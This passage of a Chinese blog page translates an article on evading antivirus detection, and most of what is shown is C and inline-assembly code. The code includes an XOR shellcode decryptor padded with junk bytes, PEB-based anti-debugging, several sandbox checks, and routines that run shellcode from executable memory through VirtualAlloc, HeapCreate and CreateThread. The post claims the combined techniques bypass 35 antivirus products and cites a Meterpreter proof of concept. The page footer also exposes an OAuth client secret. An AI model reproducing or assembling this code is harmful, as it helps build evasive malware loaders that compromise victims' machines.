class="line">– 创建受保护的内存区域</span><br><span class="line">– 创建很多进程</span><br><span class="line">– 尝试长时间休眠</span><br><span class="line">– 不常见的sections</span><br><span class="line">– 读取Windows产品ID</span><br><span class="line">– 包含解密循环</span><br><span class="line">– 包含启动/交互设备驱动程序的功能</span><br><span class="line">– 包含阻止用户输入的功能</span><br><span class="line">…</span><br><span class="line">在编写我们的AV检测和解密Shellcode函数时，我们必须注意以下所有规则。</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">### 解密Shellcode</span></span><br><span class="line">混淆解密函数至关重要，大多数反病毒软件启发式引擎都能够检测PE文件内部的解密循环，在勒索软件攻击案例大量增加之后，甚至构建了一些启发式引擎专门用于检测加密/解密函数，一旦检测到解密函数，某些扫描器会等到ECX寄存器为<span class="number">0</span>时，预示解密循环结束，扫描器会去分析被解密的文件内容</span><br><span class="line">下面就是Decrypt Shellcode函数：</span><br></pre></td></tr></table></figure><br><br>void DecryptShellcode() {<br>  for (int i = 0; i &lt; sizeof(Shellcode); i++) {<br><br>    <strong>asm<br>    {<br>      PUSH EAX<br>      XOR EAX, EAX<br>      JZ True1
+      </strong>asm <strong>emit(0xca)
+      </strong>asm <strong>emit(0x55)
+      </strong>asm <strong>emit(0x78)
+      </strong>asm <strong>emit(0x2c)
+      </strong>asm <strong>emit(0x02)
+      </strong>asm <strong>emit(0x9b)
+      </strong>asm <strong>emit(0x6e)
+      </strong>asm <strong>emit(0xe9)
+      </strong>asm <strong>emit(0x3d)
+      </strong>asm <strong>emit(0x6f)<br><br>      True1:<br>      POP EAX<br>    }<br>    Shellcode[i] = (Shellcode[i] ^ Key[(i % sizeof(Key))]);
+    </strong>asm<br>    {<br>      PUSH EAX<br>      XOR EAX, EAX<br>      JZ True2<br>      <strong>asm </strong>emit(0xd5)<br>      <strong>asm </strong>emit(0xb6)<br>      <strong>asm </strong>emit(0x43)<br>      <strong>asm </strong>emit(0x87)<br>      <strong>asm </strong>emit(0xde)<br>      <strong>asm </strong>emit(0x37)<br>      <strong>asm </strong>emit(0x24)<br>      <strong>asm </strong>emit(0xb0)<br>      <strong>asm </strong>emit(0x3d)<br>      <strong>asm </strong>emit(0xee)<br>      True2:<br>      POP EAX<br>    }<br>  }<br>}<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这是一个<span class="keyword">for</span>循环，它使shellcode字节和key字节之间进行逻辑异或运算，而前后两部分汇编代码（有_asm开始的）是无意义的，使用随机字节覆盖逻辑异或运算但是执行时会跳过这部分代码。由于我们没有使用任何高级解密机制，因此足以混淆Decrypt Shellcode功能。</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">### 动态分析检测</span></span><br><span class="line">同样，在编写沙箱检测函数时，需要对其进行混淆，如果启发式引擎检测到任何反逆向工程方法的信息，则对恶意软件的威胁评分将非常不利。</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">### 当前是否在被调试</span></span><br><span class="line">我们的第一个反病毒检测机制将在我们的进程中检查调试器，需要使用一个Windows API函数，功能为确定调用过程是否正在由用户模式调试器调试。但是我们不会使用它，因为大多数反病毒软件都在监视win API调用，因此它们可能会将此功能检测为反逆向工程方法。我们使用PEB块中的BeingDebuged标志位而不是使用API。</span><br></pre></td></tr></table></figure><br><br>// bool WINAPI IsDebuggerPresent(void);<br><strong>asm<br>{<br>CheckDebugger:<br>  PUSH EAX                    // Save the EAX value to stack<br>  MOV EAX, [FS:0x30]          // Get PEB structure address<br>  MOV EAX, [EAX+0x02]         // Get being debugged byte<br>  TEST EAX, EAX               // Check if being debuged byte is set<br>  JNE CheckDebugger           // If debugger present check again<br>  POP EAX                     // Put back the EAX value<br>}<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过使用内联汇编，这段代码使用指向PEB块中的BeingDebuged标志位的指针，如果存在调试器，它将再次检查直到堆栈中发生溢出，当发生溢出时，堆栈会触发异常并关闭进程，这是退出程序的最简单的方法。检查是否正在被调试的将绕过一定数量的反病毒产品，但是仍有一些反病毒软件已针对此问题采取了措施，因此我们需要对代码进行混淆处理以避免静态特征码分析。</span><br></pre></td></tr></table></figure>
+
+</strong>asm<br>  {<br>  CheckDebugger:<br>    PUSH EAX<br>    MOV EAX, DWORD PTR FS : [0x18]<br>    <strong>asm<br>    {<br>      PUSH EAX<br>      XOR EAX, EAX<br>      JZ J
+      </strong>asm <strong>emit(0xea)<br>    J:<br>      POP EAX<br>    }<br>    MOV EAX, DWORD PTR[EAX + 0x30]
+    </strong>asm<br>    {<br>      PUSH EAX<br>      XOR EAX, EAX<br>      JZ J2<br>      <strong>asm </strong>emit(0xea)<br>    J2:<br>      POP EAX<br>    }<br>    CMP BYTE PTR[EAX + 2], 0<br>    <strong>asm<br>    {<br>      PUSH EAX<br>      XOR EAX, EAX<br>      JZ J3
+      </strong>asm <strong>emit(0xea)<br>    J3:<br>      POP EAX<br>    }<br>    JNE CheckDebugger<br>    POP EAX<br>  }<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我在所有操作之后都添加了跳转指令，这不会修改原始代码的作用，但是在跳转之间添加垃圾字节会混淆代码并避免被静态分析检测。</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">### 加载虚假的DLL</span></span><br><span class="line">我们将尝试在运行时加载不存在的dll。通常，当我们尝试加载不存在的dll时，HISTENCE返回<span class="literal">NULL</span>，但是某些反病毒软件动态分析时会正常返回，以便进一步检查程序的执行流程,这样就可以检测到在沙盒中执行。</span><br></pre></td></tr></table></figure><br><br>bool BypassAV(char const <em> argv[]) {<br>  HINSTANCE DLL = LoadLibrary(TEXT(“fake.dll”));<br>  if (DLL != NULL) {<br>    BypassAV(argv);<br>  }<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="preprocessor">### 运行时间</span></span><br><span class="line">在这种方法中，我们将利用反病毒软件处理时间的漏洞。在大多数情况下，反病毒软件扫描器是为终端用户设计的，它们必须对用户友好并且适合日常使用，这意味着它们不会花费太多时间来扫描文件，而需要尽快扫描文件。最初，恶意软件开发人员使用<span class="built_in">sleep</span>()函数等待扫描完成，但是如今，这种技巧几乎不再起作用，每个防病毒产品在遇到一个时都会跳过睡眠功能。我们将针对它们使用此代码，下面的代码使用了一个称为GetThickCount()的Windows API函数，该函数返回检索自系统启动以来经过的毫秒数，最长为<span class="number">49.7</span>天。我们将使用它来获取自操作系统启动以来经过的时间，然后尝试睡眠<span class="number">1</span>秒钟，在睡眠函数之后，我们将通过比较两个GetTickCout()值来检查运行环境<span class="built_in">Sleep</span>函数是否被跳过。</span><br></pre></td></tr></table></figure><br><br>int Tick = GetTickCount();<br>  Sleep(1000);<br>  int Tac = GetTickCount();<br>  if ((Tac - Tick) &lt; 1000) {<br>    return false;<br>  }<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="preprocessor">### 处理器核心数</span></span><br><span class="line"></span><br><span class="line">此方法只用查询系统上处理器核心的数量。由于反病毒软件无法从主机分配过多资源，因此我们可以检查处理器核心数，以确定我们是否在沙箱中。同时某些反病毒软件沙盒也不支持多处理器因此在其沙盒中也仅仅会保留一个处理器。</span><br></pre></td></tr></table></figure><br><br>SYSTEM_INFO SysGuide;<br>GetSystemInfo(&amp;SysGuide);<br>int CoreNum = SysGuide.dwNumberOfProcessors;<br>if (CoreNum &lt; 2) {<br>  return false;<br>}<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="preprocessor">### 大内存分配</span></span><br><span class="line">该方法也是利用了反病毒软件每次扫描的时间短的漏洞，我们只需分配近<span class="number">100</span> Mb的内存，然后将其填充为<span class="literal">NULL</span>字节，最后释放它。</span><br></pre></td></tr></table></figure><br><br>char </em> Memdmp = NULL;<br>Memdmp = (char *)malloc(100000000);<br>if (Memdmp != NULL) {<br>  memset(Memdmp, 00, 100000000);<br>  free(Memdmp);<br>}<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当程序内存在运行时开始增长时，最终反病毒软件扫描器将结束扫描，以免在文件上花费过多时间，该方法可以多次使用。这是一种非常原始和古老的技术，但它仍然绕过了大量的扫描器。</span><br><span class="line"></span><br><span class="line"><span class="comment">### trap标志位设置</span></span><br><span class="line"><span class="built_in">trap</span>标志用于单步调试跟踪程序。如果设置了此标志，则每条指令都会引发SINGLE_STEP异常。可以对陷阱标志进行操作，以阻止跟踪程序。我们可以使用以下代码操作陷阱标志。</span><br></pre></td></tr></table></figure>
+
+</strong>asm<br>{<br>  PUSHF             // Push all flags to stack<br>  MOV DWORD [ESP], 0x100    // Set 0x100 to the last flag on the stack<br>  POPF                 // Put back all flags register values<br>}<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="preprocessor">### 通过互斥量触发WinExec</span></span><br><span class="line">该方法由于其简单性而非常有前途，我们创建了一个条件来检查系统上是否已经存在某个互斥对象。</span><br></pre></td></tr></table></figure><br><br>HANDLE AmberMutex = CreateMutex(NULL, TRUE, “FakeMutex”);<br>if(GetLastError() != ERROR_ALREADY_EXISTS){<br>  WinExec(argv[0],0);<br>}<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果CreateMutex功能未返回错误，我们将再次执行该恶意软件二进制文件，因为大多数反病毒产品都不会让程序在进行动态分析时启动新进程或访问外部的文件发生，如果返回mutex已经存在错误则可以开始执行解密功能。在反检测中，互斥量使用的想法更多。</span><br><span class="line"></span><br><span class="line"><span class="comment">### 正确执行Shellcode的方法</span></span><br><span class="line">从Windows Vista开始，Microsoft引入了数据执行保护或DEP，这是一项安全功能，可以通过实时监视程序来帮助防止损坏计算机。监视可确保正在运行的程序有效地使用系统内存。如果您的计算机上存在某个程序实例错误地使用了内存，则DEP会注意到它，然后关闭该程序并通知您。这意味着您不能只将一些字节放入char数组中并执行它，而是需要使用Windows API函数使用read，write和execute标志分配一个内存区域。</span><br><span class="line">Microsoft有几个用于保留内存页面的内存操作API函数，该领域中的大多数常见恶意软件都使用VirtualAlloc功能来保留内存页面，因为您可以猜测这些函数的常见用法有助于反病毒产品使用其他内存来定义检测规则操纵功能，并且可能会引起较少的注意。</span><br><span class="line">我将列出几种具有不同内存操作API函数的shellcode执行方法：</span><br><span class="line"><span class="keyword">*</span><span class="keyword">*</span>HeapCreate/HeapAlloc<span class="keyword">*</span><span class="keyword">*</span>：</span><br><span class="line">Windows还允许创建RWE堆区域</span><br></pre></td></tr></table></figure><br><br>void ExecuteShellcode(){<br>  HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(Shellcode), sizeof(Shellcode));<br>  char <em> BUFFER = (char</em>)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(Shellcode));<br>  memcpy(BUFFER, Shellcode, sizeof(Shellcode));<br>  (<em>(void(</em>)())BUFFER)();<br>}<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">*</span><span class="keyword">*</span>LoadLibrary/GetProcAddress<span class="keyword">*</span><span class="keyword">*</span>:</span><br><span class="line">LoadLibrary和GetProcAddress win API函数组合允许我们使用所有其他win API函数，并且这种使用方式不会直接调用内存操作函数和恶意软件，因此可能不太吸引人注意。</span><br></pre></td></tr></table></figure><br><br>void ExecuteShellcode(){<br>  HINSTANCE K32 = LoadLibrary(TEXT(“kernel32.dll”));<br>  if(K32 != NULL){<br>    MYPROC Allocate = (MYPROC)GetProcAddress(K32, “VirtualAlloc”);<br>    char<em> BUFFER = (char</em>)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    memcpy(BUFFER, Shellcode, sizeof(Shellcode));<br>    (<em>(void(</em>)())BUFFER)();<br>  }<br>}<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">*</span><span class="keyword">*</span>GetModuleHandle/GetProcAddress<span class="keyword">*</span><span class="keyword">*</span>:</span><br><span class="line">该方法甚至不使用LoadLibrary函数，因为它利用了已加载的kernel32.dll的优势，GetModuleHandle函数从一个已加载的dll中检索模块句柄，这个方法大概是最隐蔽的执行方法。</span><br></pre></td></tr></table></figure><br><br>void ExecuteShellcode(){<br>  MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle(“kernel32.dll”), “VirtualAlloc”);<br>  char<em> BUFFER = (char</em>)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>  memcpy(BUFFER, Shellcode, sizeof(Shellcode));<br>  (<em>(void(</em>)())BUFFER)();<br>}<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">*</span><span class="keyword">*</span>多线程执行<span class="keyword">*</span><span class="keyword">*</span>:</span><br><span class="line">对逆向工程工程师来说，逆向多线程PE文件总是比较困难，这对于反病毒软件也是一个挑战，多线程方法可以与上述所有执行方法一起使用，将函数指针指向shellcode并通过创建新线程执行shellcode将使情况变得复杂，通过这种方式可以同时执行shellcode和检测反病毒软件。</span><br></pre></td></tr></table></figure><br><br>void ExecuteShellcode(){<br>  char<em> BUFFER = (char</em>)VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>  memcpy(BUFFER, Shellcode, sizeof(Shellcode));<br>  CreateThread(NULL,0,LPTHREAD_START_ROUTINE(BUFFER),NULL,0,NULL);<br>  while(TRUE){<br>    BypassAV(argv);<br>  }<br>}<br><code>`</code><br>上面的代码通过创建一个新线程来执行shellcode，在创建线程之后，有一个无限的whlie循环正在执行BypassAV函数，这种方法几乎可以使我们的BypassAV函数的效果翻倍，BypassAV将不断检查在运行Shellcode时使用沙箱和动态分析标志，这对于绕过某些等待执行Shellcode的高级启发式引擎也至关重要。<br><br>### 结论<br><br>最后其实关于如何编译恶意软件的方法很少，在编译源代码时，需要使用诸如堆栈保护程序之类的保护措施，并且剥离符号对于加强我们的恶意软件的逆向工程过程并减小文件大小至关重要。 ，建议使用Visual Studio进行编译，因为本文使用了内联汇编语法。<br>当所有这些方法结合在一起时，生成的恶意代码便能够绕过35种最先进的反病毒产品。<br><br><div align="center"><br><img src="/img/anti_av_av.png" align><br></div>
+
+<h2 id="POC">POC</h2><p>使用本文中介绍的技术创建的Meterpreter显示了我们的恶意软件如何在真实系统中产生结果。</p>
+<embed src="https://youtu.be/Ga4VujyjFI4" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" allowfullscreen="true" mode="transparent" type="application/x-shockwave-flash">
+
+<p>这些方法迟早也会过期，但是总会有更多的方法绕过反病毒软件。</p>
+<h2 id="第二部分">第二部分</h2><p>反检测的艺术第二部分已经发表，通过以下链接可以查看：<a href="http://www.youngroe.com/art-of-anti-detection-2-pe-backdoor-manufacturing/">http://www.youngroe.com/art-of-anti-detection-2-pe-backdoor-manufacturing/</a></p>
+<h2 id="参考">参考</h2><p>[1] – <a href="https://en.wikipedia.org/wiki/Antivirus_software" target="_blank" rel="external">https://en.wikipedia.org/wiki/Antivirus_software</a><br>[2] – <a href="https://en.wikipedia.org/wiki/Static_program_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Static_program_analysis</a><br>[3] – <a href="https://en.wikipedia.org/wiki/Dynamic_program_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Dynamic_program_analysis</a><br>[4] – <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)" target="_blank" rel="external">https://en.wikipedia.org/wiki/Sandbox_(computer_security)</a><br>[5] – <a href="https://en.wikipedia.org/wiki/Heuristic_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Heuristic_analysis</a><br>[6] – <a href="https://en.wikipedia.org/wiki/Entropy" target="_blank" rel="external">https://en.wikipedia.org/wiki/Entropy</a><br>[7] – <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>[8] –  <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx</a><br>The Antivirus Hacker’s Handbook<br>The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System<br><a href="http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf" target="_blank" rel="external">http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf</a><br><a href="http://pferrie.host22.com/papers/antidebug.pdf" target="_blank" rel="external">http://pferrie.host22.com/papers/antidebug.pdf</a><br><a href="https://www.symantec.com/connect/articles/windows-anti-debug-reference" target="_blank" rel="external">https://www.symantec.com/connect/articles/windows-anti-debug-reference</a><br><a href="https://www.exploit-db.com/docs/18849.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/18849.pdf</a><br><a href="http://blog.sevagas.com/?Fun-combining-anti-debugging-and" target="_blank" rel="external">http://blog.sevagas.com/?Fun-combining-anti-debugging-and</a></p>
+<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/</a></em></p>
+
+      
+    </div>
+    <footer>
+      
+
+        
+          <div class="alignleft post-nav">
+            <em>上一篇: </em><a href="/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门（翻译）</a>
+          </div>
+        
+        
+          <div class="alignright post-nav">
+            <em>下一篇: </em><a href="/2020/08/02/Life/dns_hijacking/">记录一次被DNS劫持及解决方案(非改hosts方式)</a>
+          </div>
+          <div class="clearfix"></div>
+        
+
+        
+          <div class="copyright">
+            
+              <span class="claim">转载请注明youngroe.com</span>
+            
+            
+              <span class="from-link">
+                <em>本文链接地址:</em>
+                <a href="/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">
+                  http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/
+                </a>
+              </span>
+            
+          </div>
+        
+        
+  
+  <div class="categories">
+    <a href="/categories/Cybersecurity/">Cybersecurity</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/反病毒/">反病毒</a>
+  </div>
+
+        
+          <! -- 添加捐赠图标 -->
+<div class ="post-donate">
+    <div id="donate_board" class="donate_bar center">
+        <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏"></a>
+        <span class="donate_txt">
+           ↑<br>
+           欣赏此文？求鼓励，求支持！
+        </span>
+        <br>
+      </div>  
+    <div id="donate_guide" class="donate_bar center hidden" >
+        <!-- 方式一： 
+            ![](/img/Alipay.jpg)
+            ![](/img/WeChatpay.jpg)
+        -->
+        <!-- 方式二；
+            step1：在_config.yml中添加配置
+                Alipay: /img/Alipay.jpg
+                WeChatpay: /img/WeChatpay.jpg
+            step2：此处两张图片的路径分别设置为如下
+                <img src="undefined"
+                <img src="undefined"
+        -->
+        <!-- 支付宝打赏图案 -->
+        <img src="/img/Alipay.png" alt="支付宝打赏">
+        <!-- 微信打赏图案 -->
+        <img src="/img/WeChatpay.png" alt="微信打赏">
+    </div>
+    <script type="text/javascript">
+        document.getElementById('btn_donate').onclick = function(){
+            $('#donate_board').addClass('hidden');
+            $('#donate_guide').removeClass('hidden');
+        }
+    </script>
+</div>
+<! -- 添加捐赠图标 -->
+        
+        <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+  clientID: '503c39aa3fb2b8c1b734',
+  clientSecret: '65d784ff7a95a9dbf4a4208c9e32166ca29654f2',
+  repo: 'geemion.github.io',
+  owner: 'geemion',
+  admin: 'geemion',
+  pagerDirection:'first',
+  id: md5(window.location.pathname)
+})
+
+gitalk.render('gitalk-container')
+</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+  <div id="container"></div>
+</span>
+</article>
+
+
+<section id="comment">
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/Cybersecurity/">Cybersecurity</a><small>3</small></li>
+  
+    <li><a href="/categories/Debug/">Debug</a><small>7</small></li>
+  
+    <li><a href="/categories/Kernel/">Kernel</a><small>4</small></li>
+  
+    <li><a href="/categories/Learning/">Learning</a><small>8</small></li>
+  
+    <li><a href="/categories/Life/">Life</a><small>6</small></li>
+  
+    <li><a href="/categories/Others/">Others</a><small>1</small></li>
+  
+    <li><a href="/categories/Tools/">Tools</a><small>6</small></li>
+  
+    <li><a href="/categories/Vulnerabilities/">Vulnerabilities</a><small>0</small></li>
+  
+    <li><a href="/categories/Windows/">Windows</a><small>13</small></li>
+  
+    <li><a href="/categories/life/">life</a><small>0</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">最新文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门（翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述（翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/08/02/Life/dns_hijacking/">记录一次被DNS劫持及解决方案(非改hosts方式)</a>
+      </li>
+    
+      <li>
+        <a href="/2019/07/01/Windows/delphi_reverse_summary/">Delphi程序逆向反汇编技巧小记</a>
+      </li>
+    
+      <li>
+        <a href="/2019/06/25/Kernel/kernel_enum_wfp_callout_function/">Windows内核重拾：如何枚举系统中Windows Filtering Platform (WFP)驱动中的callout函数</a>
+      </li>
+    
+      <li>
+        <a href="/2019/05/06/Kernel/windows-driver-testing-basics/">Windows内核重拾：Windows驱动测试基础：工具、功能和示例（翻译/转载）</a>
+      </li>
+    
+      <li>
+        <a href="/2019/04/06/Windows/how-to-reverse-engineer-software-windows-in-a-right-way/">如何正确的对Windows软件进行逆向工程（翻译/转载）</a>
+      </li>
+    
+      <li>
+        <a href="/2019/01/12/Windows/a_crash_lead_deadlock/">Windows平台下一个崩溃而导致的死锁分析</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/06/Cybersecurity/ddos-protection-techniques/">现代DDoS对抗技术概述（翻译/转载）</a>
+      </li>
+    
+      <li>
+        <a href="/2018/09/18/Life/xian/">西安周末游</a>
+      </li>
+    
+      <li>
+        <a href="/2018/01/06/Kernel/WindowsKernel_DebugObject/">Windows内核重拾：DebugObject</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/ASM/" style="font-size: 10px;">ASM</a> <a href="/tags/Boost/" style="font-size: 10px;">Boost</a> <a href="/tags/DDoS/" style="font-size: 10px;">DDoS</a> <a href="/tags/DNS-over-HTTPS/" style="font-size: 10px;">DNS-over-HTTPS</a> <a href="/tags/DNS劫持/" style="font-size: 10px;">DNS劫持</a> <a href="/tags/Delphi/" style="font-size: 10px;">Delphi</a> <a href="/tags/Dll劫持/" style="font-size: 10px;">Dll劫持</a> <a href="/tags/GCC-GDB/" style="font-size: 10px;">GCC&GDB</a> <a href="/tags/GetVersionEx/" style="font-size: 10px;">GetVersionEx</a> <a href="/tags/Http/" style="font-size: 10px;">Http</a> <a href="/tags/IDA-Pro/" style="font-size: 13.33px;">IDA Pro</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/MSDN/" style="font-size: 13.33px;">MSDN</a> <a href="/tags/Malware/" style="font-size: 13.33px;">Malware</a> <a href="/tags/MiniDumpWriteDump/" style="font-size: 10px;">MiniDumpWriteDump</a> <a href="/tags/PEB/" style="font-size: 10px;">PEB</a> <a href="/tags/Procmon/" style="font-size: 10px;">Procmon</a> <a href="/tags/Runtime-Error/" style="font-size: 10px;">Runtime Error</a> <a href="/tags/SEH/" style="font-size: 10px;">SEH</a> <a href="/tags/SysinternalsSuite/" style="font-size: 10px;">SysinternalsSuite</a> <a href="/tags/Tips/" style="font-size: 10px;">Tips</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/UAF漏洞/" style="font-size: 10px;">UAF漏洞</a> <a href="/tags/VC/" style="font-size: 10px;">VC</a> <a href="/tags/Visual-Studio/" style="font-size: 13.33px;">Visual Studio</a> <a href="/tags/Windbg/" style="font-size: 10px;">Windbg</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/getaddrinfo/" style="font-size: 10px;">getaddrinfo</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/libeay32/" style="font-size: 10px;">libeay32</a> <a href="/tags/markdown/" style="font-size: 10px;">markdown</a> <a href="/tags/ndk/" style="font-size: 10px;">ndk</a> <a href="/tags/sublime-text3/" style="font-size: 10px;">sublime text3</a> <a href="/tags/x64/" style="font-size: 10px;">x64</a> <a href="/tags/体验/" style="font-size: 10px;">体验</a> <a href="/tags/内核/" style="font-size: 13.33px;">内核</a> <a href="/tags/内核结构/" style="font-size: 16.67px;">内核结构</a> <a href="/tags/反病毒/" style="font-size: 13.33px;">反病毒</a> <a href="/tags/安全机制/" style="font-size: 10px;">安全机制</a> <a href="/tags/异常处理/" style="font-size: 10px;">异常处理</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/服务/" style="font-size: 10px;">服务</a> <a href="/tags/权限/" style="font-size: 13.33px;">权限</a> <a href="/tags/栈溢出漏洞/" style="font-size: 10px;">栈溢出漏洞</a> <a href="/tags/测试/" style="font-size: 10px;">测试</a> <a href="/tags/漏洞调试/" style="font-size: 13.33px;">漏洞调试</a> <a href="/tags/生活/" style="font-size: 16.67px;">生活</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/西安/" style="font-size: 10px;">西安</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/读书/" style="font-size: 10px;">读书</a> <a href="/tags/调试/" style="font-size: 16.67px;">调试</a> <a href="/tags/转换/" style="font-size: 10px;">转换</a> <a href="/tags/进程/" style="font-size: 10px;">进程</a> <a href="/tags/逆向/" style="font-size: 10px;">逆向</a> <a href="/tags/重庆/" style="font-size: 10px;">重庆</a> <a href="/tags/驱动/" style="font-size: 16.67px;">驱动</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">Links</h3>
+<ul class="entry">
+<li><a href="http://blog.ourren.com/" title="Ourren">Ourren</a></li>
+<li><a href="http://www.hyjal.net/" title="Hyjal">Hyjal</a></li>
+<li><a href="http://www.jianshu.com/users/fa15f4e416ae/latest_articles" title="Daemonceltics">Daemonceltics</a></li>
+<li><a href="http://papap.info/" title="isee">isee</a></li>
+</ul>
+</div>
+
+  <script type="text/javascript" id="clustrmaps" src="//cdn.clustrmaps.com/map_v2.js?u=putG&d=yoFnN6V-ovhL-H4e9_69LvkTiX4uX7rEYJ15yL3G1Wg"></script>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <div id="go-pg-top"><i class="icon-arrow-up"></i></div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2021 Lyon
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/page.js"></script>
+
+</body>
+
+</html>
